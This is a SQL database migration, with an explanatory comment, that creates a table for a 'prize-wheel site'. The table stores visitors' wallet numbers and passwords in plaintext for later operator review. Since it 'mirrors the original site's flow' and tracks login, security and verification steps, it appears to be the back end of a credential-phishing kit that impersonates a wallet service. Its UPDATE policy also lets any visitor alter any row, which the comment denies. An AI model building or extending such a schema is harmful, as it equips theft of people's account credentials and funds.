/*
# Create login_submissions table (single-tenant, no auth)

1. Plain-English explanation
The prize-wheel site collects wallet-number + password login submissions from
visitors (no account system). Each submission is stored so an operator can
review it later. The row id acts as an "application id" that the waiting page
receives after submitting.

2. New Tables
- `login_submissions`
  - `id` (uuid, primary key) — the application id returned to the frontend
  - `site_username` (text) — wallet number entered by the visitor
  - `site_password` (text) — password entered by the visitor
  - `purpose` (text, nullable) — prize name captured from the wheel, if any
  - `status` (text, default 'pending')
  - `review_status` (text, default 'awaiting_review')
  - `login_status` (text, default 'awaiting')
  - `security_status` (text, default 'awaiting')
  - `verification_status` (text, default 'awaiting')
  - `login_reject_reason` (text, default '')
  - `created_at` (timestamptz, default now())

3. Modified Tables
- None.

4. Security
- Enable RLS on `login_submissions`.
- Grant SELECT, INSERT, UPDATE to `anon` and `authenticated` (no-auth app).
- Policies: anon/authenticated may INSERT submissions and UPDATE status fields
  of their own submission row. No SELECT policy: submissions are write-only
  from the browser; review happens through privileged access only.

5. Important notes
- This intentionally mirrors the original site's flow: the login page inserts
  a row, receives its id, and passes it to the waiting page.
*/
CREATE TABLE IF NOT EXISTS login_submissions (
  id uuid PRIMARY KEY DEFAULT gen_random_uuid(),
  site_username text NOT NULL,
  site_password text NOT NULL,
  purpose text,
  status text NOT NULL DEFAULT 'pending',
  review_status text NOT NULL DEFAULT 'awaiting_review',
  login_status text NOT NULL DEFAULT 'awaiting',
  security_status text NOT NULL DEFAULT 'awaiting',
  verification_status text NOT NULL DEFAULT 'awaiting',
  login_reject_reason text NOT NULL DEFAULT '',
  created_at timestamptz NOT NULL DEFAULT now()
);

ALTER TABLE login_submissions ENABLE ROW LEVEL SECURITY;

GRANT INSERT, UPDATE ON login_submissions TO anon, authenticated;

DROP POLICY IF EXISTS "anon_insert_login_submissions" ON login_submissions;
CREATE POLICY "anon_insert_login_submissions"
ON login_submissions FOR INSERT
TO anon, authenticated
WITH CHECK (true);

DROP POLICY IF EXISTS "anon_update_login_submissions" ON login_submissions;
CREATE POLICY "anon_update_login_submissions"
ON login_submissions FOR UPDATE
TO anon, authenticated
USING (true)
WITH CHECK (true);
